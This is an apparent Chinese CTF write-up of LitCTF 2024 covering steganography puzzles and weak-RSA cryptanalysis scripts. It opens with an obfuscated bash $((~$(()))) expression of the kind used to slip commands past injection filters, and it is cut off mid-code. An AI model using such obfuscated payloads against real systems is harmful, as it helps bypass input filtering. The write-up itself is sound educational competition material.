<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token variable"><span class="token variable">$((</span><span class="token operator">~</span>$<span class="token punctuation">((</span>$<span class="token punctuation">((</span><span class="token operator">~</span>$<span class="token punctuation">((</span><span class="token variable">))</span></span><span class="token punctuation">))</span><span class="token variable"><span class="token variable">$((</span><span class="token operator">~</span>$<span class="token punctuation">((</span><span class="token variable">))</span></span><span class="token punctuation">))</span><span class="token variable"><span class="token variable">$((</span><span class="token operator">~</span>$<span class="token punctuation">((</span><span class="token variable">))</span></span><span class="token punctuation">))</span><span class="token variable"><span class="token variable">$((</span><span class="token operator">~</span>$<span class="token punctuation">((</span><span class="token variable">))</span></span><span class="token punctuation">))</span><span class="token variable"><span class="token variable">$((</span><span class="token operator">~</span>$<span class="token punctuation">((</span><span class="token variable">))</span></span><span class="token punctuation">))</span><span class="token variable"><span class="token variable">$((</span><span class="token operator">~</span>$<span class="token punctuation">((</span><span class="token variable">))</span></span><span class="token punctuation">))</span><span class="token variable"><span class="token variable">$((</span><span class="token operator">~</span>$<span class="token punctuation">((</span><span class="token variable">))</span></span><span class="token punctuation">))</span><span class="token variable"><span class="token variable">$((</span><span class="token operator">~</span>$<span class="token punctuation">((</span><span class="token variable">))</span></span><span class="token punctuation">))</span><span class="token variable"><span class="token variable">$((</span><span class="token operator">~</span>$<span class="token punctuation">((</span><span class="token variable">))</span></span><span class="token punctuation">))</span><span class="token variable"><span class="token variable">$((</span><span class="token operator">~</span>$<span class="token punctuation">((</span><span class="token variable">))</span></span><span class="token punctuation">))</span><span class="token variable"><span class="token variable">$((</span><span class="token operator">~</span>$<span class="token punctuation">((</span><span class="token variable">))</span></span><span class="token punctuation">))</span><span class="token variable"><span class="token variable">$((</span><span class="token operator">~</span>$<span class="token punctuation">((</span><span class="token variable">))</span></span><span class="token punctuation">))</span><span class="token variable"><span class="token variable">$((</span><span class="token operator">~</span>$<span class="token punctuation">((</span><span class="token variable">))</span></span><span class="token punctuation">))</span><span class="token punctuation">))</span><span class="token punctuation">))</span></code></pre>
<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="涐贪恋和伱、甾―⑺de毎兮毎秒"><a href="#涐贪恋和伱、甾―⑺de毎兮毎秒" class="headerlink" title="涐贪恋和伱、甾―⑺dé毎兮毎秒"></a>涐贪恋和伱、甾―⑺dé毎兮毎秒</h3><p>LSB最低有效位隐写<br><img src="https://ooo.0x0.ooo/2024/06/04/OJSwKq.webp" alt="OJSwKq.webp" loading="lazy"></p>
<h3 id="你说得对，但"><a href="#你说得对，但" class="headerlink" title="你说得对，但__"></a>你说得对，但__</h3><p>binwalk分解出4个图片拼成一个二维码<br><img src="https://ooo.0x0.ooo/2024/06/04/OJ0MSc.webp" alt="OJ0MSc.webp" loading="lazy"></p>
<h3 id="盯帧珍珠"><a href="#盯帧珍珠" class="headerlink" title="盯帧珍珠"></a>盯帧珍珠</h3><p>010打开发现是gif格式<br><img src="https://ooo.0x0.ooo/2024/06/04/OJ0Owr.webp" alt="OJ0Owr.webp" loading="lazy"><br>steg抽帧拿到flag<br><img src="https://ooo.0x0.ooo/2024/06/04/OJ0o1M.webp" alt="OJ0o1M.webp" loading="lazy"><br><img src="https://ooo.0x0.ooo/2024/06/04/OJ0qDG.webp" alt="OJ0qDG.webp" loading="lazy"><br><img src="https://ooo.0x0.ooo/2024/06/04/OJ0581.webp" alt="OJ0581.webp" loading="lazy"><br><img src="https://ooo.0x0.ooo/2024/06/04/OJ0TkI.webp" alt="OJ0TkI.webp" loading="lazy"></p>
<h3 id="原铁，启动！"><a href="#原铁，启动！" class="headerlink" title="原铁，启动！"></a>原铁，启动！</h3><p>原神和星铁的字体<br><img src="https://ooo.0x0.ooo/2024/06/04/OJ0UpD.webp" alt="OJ0UpD.webp" loading="lazy"><br><img src="https://ooo.0x0.ooo/2024/06/04/OJ0WfF.webp" alt="OJ0WfF.webp" loading="lazy"><br><img src="https://ooo.0x0.ooo/2024/06/04/OJ0k56.webp" alt="OJ0k56.webp" loading="lazy"><br>FLAG{GOOD_GAMER}转小写加头 LitCTF{good_gamer}</p>
<h3 id="Everywhere-We-Go"><a href="#Everywhere-We-Go" class="headerlink" title="Everywhere We Go"></a>Everywhere We Go</h3><p>audition打开就有<br><img src="https://ooo.0x0.ooo/2024/06/04/OJ0xKP.webp" alt="OJ0xKP.webp" loading="lazy"></p>
<h3 id="舔到最后应有尽有"><a href="#舔到最后应有尽有" class="headerlink" title="舔到最后应有尽有"></a>舔到最后应有尽有</h3><p>base64隐写，b神工具梭哈<br><img src="https://ooo.0x0.ooo/2024/06/04/OJ0Fwl.webp" alt="OJ0Fwl.webp" loading="lazy"></p>
<h3 id="关键，太关键了"><a href="#关键，太关键了" class="headerlink" title="关键，太关键了!"></a>关键，太关键了!</h3><p>词频分析拿到key<code>bingo</code><br><img src="https://ooo.0x0.ooo/2024/06/04/OJ0pHt.webp" alt="OJ0pHt.webp" loading="lazy"><br>随波逐流拿key梭哈<br><img src="https://ooo.0x0.ooo/2024/06/04/OJ0cXG.webp" alt="OJ0cXG.webp" loading="lazy"></p>
<h3 id="女装照流量"><a href="#女装照流量" class="headerlink" title="女装照流量"></a>女装照流量</h3><p>在流量包里面找到一个压缩包，导出这个压缩包，解压需要密码<br><img src="https://ooo.0x0.ooo/2024/06/04/OJ0jcP.webp" alt="OJ0jcP.webp" loading="lazy"><br>导出流量包里面的php文件，拿到解压密码<br><img src="https://ooo.0x0.ooo/2024/06/04/OJcFUU.webp" alt="OJcFUU.webp" loading="lazy"><br><img src="https://ooo.0x0.ooo/2024/06/04/OJcNEr.webp" alt="OJcNEr.webp" loading="lazy"><br>打开拿到flag<br><img src="https://ooo.0x0.ooo/2024/06/04/OJcREl.webp" alt="OJcREl.webp" loading="lazy"></p>
<h3 id="The-love"><a href="#The-love" class="headerlink" title="The love"></a>The love</h3><p>图片里发现一个压缩包<br><img src="https://ooo.0x0.ooo/2024/06/04/OJcdeL.webp" alt="OJcdeL.webp" loading="lazy"><br>提取出来发现打开需要密码<br>找密码<br><img src="https://ooo.0x0.ooo/2024/06/04/OJc8sY.webp" alt="OJc8sY.webp" loading="lazy"><br>发现存在掩码攻击<br><img src="https://ooo.0x0.ooo/2024/06/04/OJdOtG.webp" alt="OJdOtG.webp" loading="lazy"><br>密码<code>Litctf202405ftctiL</code><br><img src="https://ooo.0x0.ooo/2024/06/04/OJd5gD.webp" alt="OJd5gD.webp" loading="lazy"><br>两次base64解密拿到密码<br><img src="https://ooo.0x0.ooo/2024/06/04/OJdBVF.webp" alt="OJdBVF.webp" loading="lazy"><br>用deepsound提取一下音频文件<br><img src="https://ooo.0x0.ooo/2024/06/04/OJdUo6.webp" alt="OJdUo6.webp" loading="lazy"><br>拿到一个txt，里面是flag<br><img src="https://ooo.0x0.ooo/2024/06/04/OJdbQb.webp" alt="OJdbQb.webp" loading="lazy"></p>
<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="small-e"><a href="#small-e" class="headerlink" title="small_e"></a>small_e</h3><p>e很小，小公钥指数攻击</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> gmpy2
<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span>

<span class="token keyword">def</span> <span class="token function">de</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> e<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">:</span>
    k <span class="token operator">=</span> <span class="token number">0</span>
    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
        m <span class="token operator">=</span> c <span class="token operator">+</span> n<span class="token operator">*</span>k
        result<span class="token punctuation">,</span> flag <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>iroot<span class="token punctuation">(</span>m<span class="token punctuation">,</span> e<span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token boolean">True</span> <span class="token operator">==</span> flag<span class="token punctuation">:</span>
            <span class="token keyword">return</span> result
        k <span class="token operator">+=</span> <span class="token number">1</span>
e<span class="token operator">=</span> <span class="token number">3</span>
n<span class="token operator">=</span> <span class="token number">19041138093915757361446596917618836424321232810490087445558083446664894622882726613154205435993358657711781275735559409274819618824173042980556986038895407758062549819608054613307399838408867855623647751322414190174111523595370113664729594420259754806834656490417292174994337683676504327493103018506242963063671315605427867054873507720342850038307517016687659435974562024973531717274759193577450556292821410388268243304996720337394829726453680432751092955575512372582624694709289019402908986429709116441544332327738968785428501665254894444651547623008530708343210644814773933974042816703834571427534684321229977525229</span>
c <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">438976</span><span class="token punctuation">,</span> <span class="token number">1157625</span><span class="token punctuation">,</span> <span class="token number">1560896</span><span class="token punctuation">,</span> <span class="token number">300763</span><span class="token punctuation">,</span> <span class="token number">592704</span><span class="token punctuation">,</span> <span class="token number">343000</span><span class="token punctuation">,</span> <span class="token number">1860867</span><span class="token punctuation">,</span> <span class="token number">1771561</span><span class="token punctuation">,</span> <span class="token number">1367631</span><span class="token punctuation">,</span> <span class="token number">1601613</span><span class="token punctuation">,</span> <span class="token number">857375</span><span class="token punctuation">,</span> <span class="token number">1225043</span><span class="token punctuation">,</span> <span class="token number">1331000</span><span class="token punctuation">,</span> <span class="token number">1367631</span><span class="token punctuation">,</span> <span class="token number">1685159</span><span class="token punctuation">,</span> <span class="token number">857375</span><span class="token punctuation">,</span> <span class="token number">1295029</span><span class="token punctuation">,</span> <span class="token number">857375</span><span class="token punctuation">,</span> <span class="token number">1030301</span><span class="token punctuation">,</span> <span class="token number">1442897</span><span class="token punctuation">,</span> <span class="token number">1601613</span><span class="token punctuation">,</span> <span class="token number">140608</span><span class="token punctuation">,</span> <span class="token number">1259712</span><span class="token punctuation">,</span> <span class="token number">857375</span><span class="token punctuation">,</span> <span class="token number">970299</span><span class="token punctuation">,</span> <span class="token number">1601613</span><span class="token punctuation">,</span> <span class="token number">941192</span><span class="token punctuation">,</span> <span class="token number">132651</span><span class="token punctuation">,</span> <span class="token number">857375</span><span class="token punctuation">,</span> <span class="token number">1481544</span><span class="token punctuation">,</span> <span class="token number">1367631</span><span class="token punctuation">,</span> <span class="token number">1367631</span><span class="token punctuation">,</span> <span class="token number">1560896</span><span class="token punctuation">,</span> <span class="token number">857375</span><span class="token punctuation">,</span> <span class="token number">110592</span><span class="token punctuation">,</span> <span class="token number">1061208</span><span class="token punctuation">,</span> <span class="token number">857375</span><span class="token punctuation">,</span> <span class="token number">1331000</span><span class="token punctuation">,</span> <span class="token number">1953125</span><span class="token punctuation">]</span>
flag<span class="token operator">=</span><span class="token string">''</span>
<span class="token keyword">for</span> c <span class="token keyword">in</span> c<span class="token punctuation">:</span>
    m<span class="token operator">=</span>de<span class="token punctuation">(</span>c<span class="token punctuation">,</span>e<span class="token punctuation">,</span>n<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span>
    flag<span class="token operator">+=</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span></code></pre>
<h3 id="common-primes"><a href="#common-primes" class="headerlink" title="common_primes"></a>common_primes</h3><p>共模攻击</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># python2</span>
<span class="token keyword">from</span> gmpy2 <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span>
n1 <span class="token operator">=</span> <span class="token number">63306931765261881888912008095340470978772999620205174857271016152744820165330787864800482852578992473814976781143226630412780924144266471891939661312715157811674817013479316983665960087664430205713509995750877665395721635625035356901765881750073584848176491668327836527294900831898083545883834181689919776769</span>
n2 <span class="token operator">=</span> <span class="token number">73890412251808619164803968217212494551414786402702497903464017254263780569629065810640215252722102084753519255771619560056118922616964068426636691565703046691711267156442562144139650728482437040380743352597966331370286795249123105338283013032779352474246753386108510685224781299865560425114568893879804036573</span>
c1 <span class="token operator">=</span> <span class="token number">11273036722994861938281568979042367628277071611591846129102291159440871997302324919023708593105900105417528793646809809850626919594099479505740175853342947734943586940152981298688146019253712344529086852083823837309492466840942593843720630113494974454498664328412122979195932862028821524725158358036734514252</span>
c2 <span class="token operator">=</span> <span class="token number">42478690444030101869094906005321968598060849172551382502632480617775125215522908666432583017311390935937075283150967678500354031213909256982757457592610576392121713817693171520657833496635639026791597219755461854281419207606460025156812307819350960182028395013278964809309982264879773316952047848608898562420</span>
q<span class="token operator">=</span>gcd<span class="token punctuation">(</span>n1<span class="token punctuation">,</span>n2<span class="token punctuation">)</span>

e<span class="token operator">=</span><span class="token number">65537</span>
p<span class="token operator">=</span>n1<span class="token operator">//</span>q
phi<span class="token operator">=</span><span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>
d<span class="token operator">=</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span>phi<span class="token punctuation">)</span>
m<span class="token operator">=</span><span class="token builtin">pow</span><span class="token punctuation">(</span>c1<span class="token punctuation">,</span>d<span class="token punctuation">,</span>n1<span class="token punctuation">)</span>
flag<span class="token operator">=</span>long_to_bytes<span class="token punctuation">(</span>m<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span></code></pre>
<h3 id="CRT"><a href="#CRT" class="headerlink" title="CRT"></a>CRT</h3><p>中国剩余定理</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> gmpy2 <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">from</span> functools <span class="token keyword">import</span> <span class="token builtin">reduce</span>
N <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">16284549467215459860410219597024063610473673936290355100056351270928590364613988243842136274404316005691228851657707321037165033870804113001550943722154728825877813376691406849932899693973387282799799300076386870984605589385666352824740622229871992727011987847056429850720207816048044538068625281977059392365698031140268787802886018698622326103590834314940280191560618753408741810842189500991556860816195814550884416201667771827582907240044216817705876129993030771943110090291383205720587816820335839616491257078918258839986942101986011761809815192713499542329037877195448381127272183807358011340669666067708631770629</span><span class="token punctuation">,</span> <span class="token number">18874449316683637715798227591079994715220250787784886038879393543606786017564740000007881151950098752600868917271951840433212429335449734520464340460962870875528399394278620757114832553403790578599857545045548782264680469899469733610229824411943119032419052885845035690046611519195843721184869834557481917675133504256150187042147269721516549831707784660343957497462516302534697915170087780048689613921549811073805796084838801677337285061667687328043565589734203160196445644144798845303226939960633632967262794622796927905511547760465906600293964201276584199569541295613430382495278352554280248372584117917520373403063</span><span class="token punctuation">,</span> <span class="token number">13076908038170870040678205430512292701702182383746502395067907294908791921755288520053025319156015431312084703402938465525746196078114225446604200656116848235842943713613538425047483331236843707852400888407037547782069810250229035895403347555287877301409523248658733500963325361631821388259137561613536275954710848967383282290486421290937700396986650186236373076267188846407623991396459884128392118502565707689494271484411270172764553747426536404781904379621870642658609027074757591034785814602602669666257742808888301912575857074138613714693225934811254682687014167022418837710552784925328161453554291397460324648009</span><span class="token punctuation">,</span> <span class="token number">16378397749449315054623854181248970586445531404081850673625192835136416152712968780451149412408644689393643801969477034418829482292894114547339155149570026460766659623960243723741437212596779580161767297321149670682427000047000712397718946486472118638780090056091542235702825736985864963592363421943353726975184567975451918105247987573044010599149673027905021130138957885113596669923366241161695565837122963976988635649640547443201925034845002113548522307980664206158188711548845245115694530280375848933481227411503982144621846732228815377656607983358898296200251680387871097014543693213877074718748683243193584032307</span><span class="token punctuation">,</span> <span class="token number">16561385664507310659703460597815131331175620854125898893505075859155749890511144622913872488783791188180242785479319865960633526830814389031162024199864660323116594980719331106368397062852472114748955889862650270563487466194545102072373606964935390400328607060427961354290055443710114639781630071832997101380097322119243847190066266823291236828718017385537809056374392924015081117151158033309950857254309859691442649968222489177513517837849318096762149934959873646750864750378500351560253453052870424424427631414365680967482680769587570457938750679258205430151223470761518748987038822469422647137405393267829437115661</span><span class="token punctuation">,</span> <span class="token number">27046459277694602448592524332290812177367631061914086306537115904955610821120392893033090428641088790759783810505225125618182431554899875183961418066959811832057748013953098277804562621152445358481976221983179988257658622392669474721482514871569548645762057681213193026792187879687736985533503283192537252904253565317763028483404018596514523171644666753183517320602643087213777450193062371986178076259168860180486748722567326484282893069173271762518110920685267104269429407229859993484209639764440874444582271870147714648808732931399985199947422716048582921727875237459841962093669408116061538502016560235135864203187</span><span class="token punctuation">,</span> <span class="token number">26656304012303785684433399162699704691814095671158676770279115782799819097401667611247727555104978633884125246262630572285699884039990597392442760154412046297340436752418017863089245998557221143069544231044947583991838381529081774245290065442299808728542273138931461712874414662570197142795674160946728850452526786804787060582942714635903943088540232346797109678405554499677459722287119125623191067780196726820726456507802067342186435679967664032334075189916733352409403602499298544374351405005339596410771187606377781063995755795494682971576602822244457151090982442689870155439418641987576796032975032982289138437523</span><span class="token punctuation">,</span> <span class="token number">15430339362720939092241771692575439580654810089653970198317149114896596238037181680990393763581287618371554846982066535980062263001619707606585504112155505335852802431392213092366756058196440934454810685146101829974548748060332228708229146991380736668433937967747468330692411917426038703359064546899782163287526256750039064809093426968389929333819191207284079703677535201724530391246890003928025687520199553868464322185815354591044585221486768114570373992719977614232251764409893171263639718616620216630797031237033969290978218328767317279717825174597882707772846934097838694418308236053838800414834627456689940059791</span><span class="token punctuation">,</span> <span class="token number">18567217334857361786819913577261265078968886790989901098066320191741355103505838160569648197557648144402318678198622602821398215265062903833980611331991924162821902705417905758829862021425828310098183855605162264362860669298956185657733562472361876121183146316333113433547558152618165933865808900552444816088227098441082165477634812598644531670232452276788291537671779564658425789722419032860803991282640262179618723470437500425645011269733791887608702964571393657348573277992781115199432229176320688981128912052074722348557580462855962547978505669490105804175211061178124988260957275350940324541120102820024607088877</span><span class="token punctuation">,</span> <span class="token number">10779265483116424102513175333888918968735912126282080716409998310381429332303237383487628664073567555863832134055945636657550074126628975203541323090803941066893475056319351674995896497450955897099614503220268400135112031310669044989879413178359759130908036871112663414065113664951350386824618325532532761206110118269005313068956882540007289422776225718534047101012876346009269097785027585782628699252006893938086064139042361425306202870627629615292450559291783382487842611805623198422252868756644595549320868144393828052610953995595915294930701560599016888539448223935199483656756326744914184772404419968728372785709</span><span class="token punctuation">]</span>
c <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">644471004204038587358576160407417490938643306027967868486894032686145771114614076076527690366372762614045209015175209880518279715723521182568975220993976451106760236390912778371250746699463366097164369672789316408520079193370191810477580463635224092686607896863852671881543817329521589324466628227730589108339783619357530316049670209743367574983963078106666377633552745384690084183804939047320711873053569717432670155045869610477526046503868585690544254566603491357805849009447674789480061139157433156989123228768899846183291164697221164452100037658563026884070301188916984245139290761779580443049</span><span class="token punctuation">,</span> <span class="token number">644471004204038587358576160407417490938643306027967868486894032686145771114614076076527690366372762614045209015175209880518279715723521182568975220993976451106760236390912778371250746699463366097164369672789316408520079193370191810477580463635224092686607896863852671881543817329521589324466628227730589108339783619357530316049670209743367574983963078106666377633552745384690084183804939047320711873053569717432670155045869610477526046503868585690544254566603491357805849009447674789480061139157433156989123228768899846183291164697221164452100037658563026884070301188916984245139290761779580443049</span><span class="token punctuation">,</span> <span class="token number">644471004204038587358576160407417490938643306027967868486894032686145771114614076076527690366372762614045209015175209880518279715723521182568975220993976451106760236390912778371250746699463366097164369672789316408520079193370191810477580463635224092686607896863852671881543817329521589324466628227730589108339783619357530316049670209743367574983963078106666377633552745384690084183804939047320711873053569717432670155045869610477526046503868585690544254566603491357805849009447674789480061139157433156989123228768899846183291164697221164452100037658563026884070301188916984245139290761779580443049</span><span class="token punctuation">,</span> <span class="token number">644471004204038587358576160407417490938643306027967868486894032686145771114614076076527690366372762614045209015175209880518279715723521182568975220993976451106760236390912778371250746699463366097164369672789316408520079193370191810477580463635224092686607896863852671881543817329521589324466628227730589108339783619357530316049670209743367574983963078106666377633552745384690084183804939047320711873053569717432670155045869610477526046503868585690544254566603491357805849009447674789480061139157433156989123228768899846183291164697221164452100037658563026884070301188916984245139290761779580443049</span><span class="token punctuation">,</span> <span class="token number">644471004204038587358576160407417490938643306027967868486894032686145771114614076076527690366372762614045209015175209880518279715723521182568975220993976451106760236390912778371250746699463366097164369672789316408520079193370191810477580463635224092686607896863852671881543817329521589324466628227730589108339783619357530316049670209743367574983963078106666377633552745384690084183804939047320711873053569717432670155045869610477526046503868585690544254566603491357805849009447674789480061139157433156989123228768899846183291164697221164452100037658563026884070301188916984245139290761779580443049</span><span class="token punctuation">,</span> <span class="token number">644471004204038587358576160407417490938643306027967868486894032686145771114614076076527690366372762614045209015175209880518279715723521182568975220993976451106760236390912778371250746699463366097164369672789316408520079193370191810477580463635224092686607896863852671881543817329521589324466628227730589108339783619357530316049670209743367574983963078106666377633552745384690084183804939047320711873053569717432670155045869610477526046503868585690544254566603491357805849009447674789480061139157433156989123228768899846183291164697221164452100037658563026884070301188916984245139290761779580443049</span><span class="token punctuation">,</span> <span class="token number">644471004204038587358576160407417490938643306027967868486894032686145771114614076076527690366372762614045209015175209880518279715723521182568975220993976451106760236390912778371250746699463366097164369672789316408520079193370191810477580463635224092686607896863852671881543817329521589324466628227730589108339783619357530316049670209743367574983963078106666377633552745384690084183804939047320711873053569717432670155045869610477526046503868585690544254566603491357805849009447674789480061139157433156989123228768899846183291164697221164452100037658563026884070301188916984245139290761779580443049</span><span class="token punctuation">,</span> <span class="token number">644471004204038587358576160407417490938643306027967868486894032686145771114614076076527690366372762614045209015175209880518279715723521182568975220993976451106760236390912778371250746699463366097164369672789316408520079193370191810477580463635224092686607896863852671881543817329521589324466628227730589108339783619357530316049670209743367574983963078106666377633552745384690084183804939047320711873053569717432670155045869610477526046503868585690544254566603491357805849009447674789480061139157433156989123228768899846183291164697221164452100037658563026884070301188916984245139290761779580443049</span><span class="token punctuation">,</span> <span class="token number">644471004204038587358576160407417490938643306027967868486894032686145771114614076076527690366372762614045209015175209880518279715723521182568975220993976451106760236390912778371250746699463366097164369672789316408520079193370191810477580463635224092686607896863852671881543817329521589324466628227730589108339783619357530316049670209743367574983963078106666377633552745384690084183804939047320711873053569717432670155045869610477526046503868585690544254566603491357805849009447674789480061139157433156989123228768899846183291164697221164452100037658563026884070301188916984245139290761779580443049</span><span class="token punctuation">,</span> <span class="token number">644471004204038587358576160407417490938643306027967868486894032686145771114614076076527690366372762614045209015175209880518279715723521182568975220993976451106760236390912778371250746699463366097164369672789316408520079193370191810477580463635224092686607896863852671881543817329521589324466628227730589108339783619357530316049670209743367574983963078106666377633552745384690084183804939047320711873053569717432670155045869610477526046503868585690544254566603491357805849009447674789480061139157433156989123228768899846183291164697221164452100037658563026884070301188916984245139290761779580443049</span><span class="token punctuation">]</span>
<span class="token keyword">def</span> <span class="token function">chinese_remainder</span><span class="token punctuation">(</span>modulus<span class="token punctuation">,</span> remainders<span class="token punctuation">)</span><span class="token punctuation">:</span>
    Sum <span class="token operator">=</span> <span class="token number">0</span>
    prod <span class="token operator">=</span> <span class="token builtin">reduce</span><span class="token punctuation">(</span><span class="token keyword">lambda</span> a<span class="token punctuation">,</span> b<span class="token punctuation">:</span> a<span class="token operator">*</span>b<span class="token punctuation">,</span> modulus<span class="token punctuation">)</span>
    <span class="token keyword">for</span> m_i<span class="token punctuation">,</span> r_i <span class="token keyword">in</span> <span class="token builtin">zip</span><span class="token punctuation">(</span>modulus<span class="token punctuation">,</span> remainders<span class="token punctuation">)</span><span class="token punctuation">:</span>
        p <span class="token operator">=</span> prod <span class="token operator">//</span> m_i
        Sum <span class="token operator">+=</span> r_i <span class="token operator">*</span> <span class="token punctuation">(</span>inverse<span class="token punctuation">(</span>p<span class="token punctuation">,</span>m_i<span class="token punctuation">)</span><span class="token operator">*</span>p<span class="token punctuation">)</span>
    <span class="token keyword">return</span> Sum <span class="token operator">%</span> prod
e <span class="token operator">=</span> <span class="token number">10</span>
pow_m_e <span class="token operator">=</span> chinese_remainder<span class="token punctuation">(</span>N<span class="token punctuation">,</span>c<span class="token punctuation">)</span>

m <span class="token operator">=</span> iroot<span class="token punctuation">(</span>pow_m_e<span class="token punctuation">,</span>e<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre>

<h3 id="little-fermat"><a href="#little-fermat" class="headerlink" title="little_fermat"></a>little_fermat</h3><p>qp接近可以费马分解</p>
<pre class="language-python" data-language="python"><code class="language-python">p<span class="token operator">=</span><span class="token number">11077890085511755979659110327492351475443062778113645284455542893506768080495929351346530156720969755021338935044545256776544338408890311881437358607693647</span>
q<span class="token operator">=</span><span class="token number">11077890085511755979659110327492351475443062778113645284455542893506768080495929351346530156720969755021338935044545256776544338408890311881437358607694219</span></code></pre>
<p>根据费马小定理知道x&#x3D;p-1</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">from</span> gmpy2 <span class="token keyword">import</span> <span class="token operator">*</span>
p<span class="token operator">=</span><span class="token number">11077890085511755979659110327492351475443062778113645284455542893506768080495929351346530156720969755021338935044545256776544338408890311881437358607693647</span>
q<span class="token operator">=</span><span class="token number">11077890085511755979659110327492351475443062778113645284455542893506768080495929351346530156720969755021338935044545256776544338408890311881437358607694219</span>
c <span class="token operator">=</span> <span class="token number">109215817118156917306151535199288935588358410885541150319309172366532983941498151858496142368333375769194040807735053625645757204569614999883828047720427480384683375435683833780686557341909400842874816853528007258975117265789241663068590445878241153205106444357554372566670436865722966668420239234530554168928</span>
n<span class="token operator">=</span>p<span class="token operator">*</span>q
x<span class="token operator">=</span>p<span class="token operator">-</span><span class="token number">1</span>
e <span class="token operator">=</span> <span class="token number">65537</span>
d<span class="token operator">=</span>gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span><span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
m<span class="token operator">=</span><span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span>d<span class="token punctuation">,</span>n<span class="token punctuation">)</span>
m<span class="token operator">=</span>m<span class="token operator">^</span>x
<span class="token keyword">print</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre>
<h3 id="真·EasyRSA"><a href="#真·EasyRSA" class="headerlink" title="真·EasyRSA"></a>真·EasyRSA</h3><p>n可分解得到p&#x3D;102846375519753428570573823986925744957687092615041080268232889119455234034483<br>然后欧拉函数<code>phi=p**4-p**3</code></p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> sympy <span class="token keyword">import</span> symbols<span class="token punctuation">,</span> Eq<span class="token punctuation">,</span> solve
<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">import</span> gmpy2
p<span class="token operator">=</span><span class="token number">102846375519753428570573823986925744957687092615041080268232889119455234034483</span>
n<span class="token operator">=</span>p<span class="token operator">**</span><span class="token number">4</span>
e<span class="token operator">=</span><span class="token number">65537</span>
c1<span class="token operator">=</span> <span class="token number">78995097464505692833175221336110444691706720784642201874318792576886638370795877665241433503242322048462220941850261103929220636367258375223629313880314757819288233877871049903331061261182932603536690216472460424869498053787147893179733302705430645181983825884645791816106080546937178721898460776392249707560</span>
c2<span class="token operator">=</span> <span class="token number">3784701757181065428915597927276042180461070890549646164035543821266506371502690247347168340234933318004928718562990468281285421981157783991138077081303219</span>
phi<span class="token operator">=</span>p<span class="token operator">**</span><span class="token number">4</span><span class="token operator">-</span>p<span class="token operator">**</span><span class="token number">3</span>
d<span class="token operator">=</span>gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span>phi<span class="token punctuation">)</span>
m1<span class="token operator">=</span><span class="token builtin">pow</span><span class="token punctuation">(</span>c1<span class="token punctuation">,</span>d<span class="token punctuation">,</span>n<span class="token punctuation">)</span>
m2<span class="token operator">=</span><span class="token builtin">pow</span><span class="token punctuation">(</span>c2<span class="token punctuation">,</span>d<span class="token punctuation">,</span>n<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span>m1<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span>m2<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre>
<p>没给flag，看提示给了一个新的东东<br>试了好几下，发现是新的q</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> sympy <span class="token keyword">import</span> symbols<span class="token punctuation">,</span> Eq<span class="token punctuation">,</span> solve
